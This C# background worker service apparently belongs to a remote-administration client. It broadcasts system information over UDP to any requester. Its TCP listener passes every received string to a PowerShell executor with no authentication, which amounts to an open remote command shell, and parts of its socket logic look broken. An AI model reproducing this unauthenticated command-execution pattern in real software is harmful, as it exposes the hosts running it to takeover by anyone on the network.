using System;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using System.Threading.Tasks;
using Microsoft.Extensions.Hosting;
using Microsoft.Extensions.Logging;
using ClientWorker.Getters;
using ClientWorker.ViewModel;
using ServiceStack.Text;
using System.Text;
using ClientWorker.Helper;

namespace ClientWorker
{
    public class Worker : BackgroundService
    {
        private readonly ILogger<Worker> _logger;

        private InformationSent _informationSent;
        private string _mensagem;
        private IPAddress _ip;
        private string localIP;

        public Worker(ILogger<Worker> logger)
        {
            _logger = logger;
        }
        public override Task StartAsync(CancellationToken cancellationToken)
        {
            _informationSent = InformationGetter.RetornaInformacoes();
            _mensagem = JsonSerializer.SerializeToString(_informationSent);
            Console.WriteLine("Iniciado Worker");
            var start = true;
            while (start)
            {
                start = ChegaBroadcast();
            }
            return base.StartAsync(cancellationToken);
        }

        public override Task StopAsync(CancellationToken cancellationToken)
        {

            _logger.LogInformation("Serviço foi parado.");
            return base.StopAsync(cancellationToken);
        }

        public bool ChegaBroadcast()
        {

            var Server = new UdpClient(8888);
            var ResponseData = Encoding.UTF8.GetBytes(_mensagem);
            var ClientEp = new IPEndPoint(IPAddress.Any, 0);
            var ClientRequestData = Server.Receive(ref ClientEp);
            localIP = ClientEp.Address.ToString();
            var ClientRequest = Encoding.ASCII.GetString(ClientRequestData);
            if (!string.IsNullOrEmpty(ClientRequest))
                return false;
            Server.Send(ResponseData, ResponseData.Length, ClientEp);
            //Server.Close();
            return true;
        }

        private bool ExecutaCmd()
        {
            if(string.IsNullOrEmpty(localIP))
                return false;
            TcpListener server = null;
            try
            {               

                Int32 port = 8887;
                IPAddress localAddr = IPAddress.Parse(localIP);
                

                server = new TcpListener(localAddr, port);


                server.Start();


                Byte[] bytes = new Byte[256];
                String data = null;


                while (true)
                {
                    Console.Write("Waiting for a connection... ");


                    TcpClient client = server.AcceptTcpClient();
                    Console.WriteLine("Connected!");

                    data = null;


                    NetworkStream stream = client.GetStream();

                    int i;


                    while ((i = stream.Read(bytes, 0, bytes.Length)) != 0)
                    {

                        data = Encoding.ASCII.GetString(bytes, 0, i);
                        Console.WriteLine("Received: {0}", data);
                        PowerShellManager.PowerShellExecuter(data);

                        data = data.ToUpper();

                        byte[] msg = Encoding.ASCII.GetBytes(data);


                        stream.Write(msg, 0, msg.Length);
                        Console.WriteLine("Sent: {0}", data);
                    }


                    client.Close();
                }
            }
            catch (SocketException e)
            {
                Console.WriteLine("SocketException: {0}", e);
            }
            finally
            {
                // Stop listening for new clients.
                server.Stop();
            }

            return true;

        }

        protected override async Task ExecuteAsync(CancellationToken stoppingToken)
        {
            while (!stoppingToken.IsCancellationRequested)
            {
                ExecutaCmd();
                await Task.Delay(1000, stoppingToken);
            }
        }
    }
}
